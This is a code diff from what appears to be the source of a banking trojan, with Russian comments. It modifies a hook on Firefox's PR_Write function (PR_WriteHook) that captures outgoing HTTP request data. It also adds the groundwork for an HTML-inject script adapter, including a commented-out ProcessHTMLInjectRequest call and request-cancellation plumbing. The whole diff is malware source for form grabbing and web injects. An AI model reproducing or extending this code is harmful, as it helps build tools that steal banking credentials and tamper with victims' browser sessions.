@@ -23,6 +23,7 @@
 #include "BotClasses.h"
 #include "Firefox.h"
 #include "GETDataGrabber.h"
+#include "HTMLInjectsScriptAdapter.h"
 
 #include "Modules.h"
 
@@ -476,7 +477,7 @@ bool ProcessPostData(PRequest Request)
 //----------------------------------------------------------------------------
 
 
-bool MakeInfo( PRequest Request, PCHAR buf, int len )
+bool MakeInfo( PRequest Request, PCHAR buf, int len, bool &CancelRequest )
 {
 
 	// Собираем информацию об отправляемом запросе
@@ -518,6 +519,12 @@ bool MakeInfo( PRequest Request, PCHAR buf, int len )
 		STR::Free(Path);
 		STR::Free(Host);
 		if (Request->URL == NULL) return false;
+
+		// Обрабатываем взаимодействие со скриптами инжектов
+//		ProcessHTMLInjectRequest(Request->URL, &CancelRequest);
+//		if (CancelRequest) return false;
+
+
 
         // Обрабатываем дополнительные модули
 		#ifdef HunterH
@@ -797,6 +804,7 @@ PRInt32 PR_WriteHook(PRFileDesc *fd, const void* buf, PRInt32 amount )
 	//  Метод отправки данных на сервер
 	// Для теста 
 
+	bool CancelRequest = false;
 	PCHAR PBuf = (PCHAR)buf;
 
 	PRequest Request = Request::Find(FFRequests, fd);
@@ -814,7 +822,7 @@ PRInt32 PR_WriteHook(PRFileDesc *fd, const void* buf, PRInt32 amount )
 		
 
   
-		if (MakeInfo(Request, (PCHAR)buf, (int)amount ) )
+		if (MakeInfo(Request, (PCHAR)buf, (int)amount, CancelRequest ) )
 		{
 
 			#ifdef JavaClient2015SaverH
@@ -834,7 +842,10 @@ PRInt32 PR_WriteHook(PRFileDesc *fd, const void* buf, PRInt32 amount )
 		}
 	}
 
-	return PR_WriteReal(fd, buf, amount);
+	PRInt32 Result = PR_WriteReal(fd, buf, amount);
+	if (CancelRequest)
+		CancelRequest = false;
+	return Result;
 }
 //---------------------------------------------------------------------------
 
